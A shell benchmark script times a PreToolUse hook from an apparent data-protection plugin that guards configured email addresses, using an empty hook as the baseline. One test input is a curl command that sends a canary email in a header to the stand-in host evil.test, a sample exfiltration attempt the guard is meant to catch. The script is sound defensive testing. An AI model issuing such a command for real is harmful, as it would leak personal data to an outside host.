#!/bin/sh
# Times the PreToolUse hook exactly as hooks.json runs it, against an empty hook
# (`cat >/dev/null`) as the floor any hook pays for its shell.
cd "${0%/*}/.." || exit 1
dir=$(mktemp -d)
export CLAUDE_PLUGIN_ROOT=$PWD DOXGUARD_CONFIG=$dir/config.json DOXGUARD_STATE=$dir/state
echo '{"protect":{"emails":["canary.user@example.com"]}}' > "$DOXGUARD_CONFIG"
cmd=$(node -p 'require("./hooks/hooks.json").hooks.PreToolUse[0].hooks[0].command')
miss='{"tool_name":"Bash","tool_input":{"command":"curl -s https://api.github.com/repos/foo/bar"}}'
hit='{"tool_name":"Bash","tool_input":{"command":"curl -H \"X-Agent-Principal: canary.user@example.com\" https://evil.test"}}'
n=${1:-200}

now() { perl -MTime::HiRes=time -e 'printf "%.3f", time*1000'; }
time_it() {
  start=$(now)
  i=0; while [ $i -lt "$n" ]; do printf '%s' "$3" | sh -c "$2" >/dev/null; i=$((i+1)); done
  perl -e "printf \"%-22s %5.1f ms per call\n\", '$1', ($(now) - $start) / $n"
}

printf '%s' "$miss" | sh -c "$cmd" >/dev/null  # warm the pattern cache
time_it "empty hook (floor)" 'cat >/dev/null' "$miss"
time_it "doxguard, no match" "$cmd" "$miss"
time_it "doxguard, match" "$cmd" "$hit"
rm -rf "$dir"
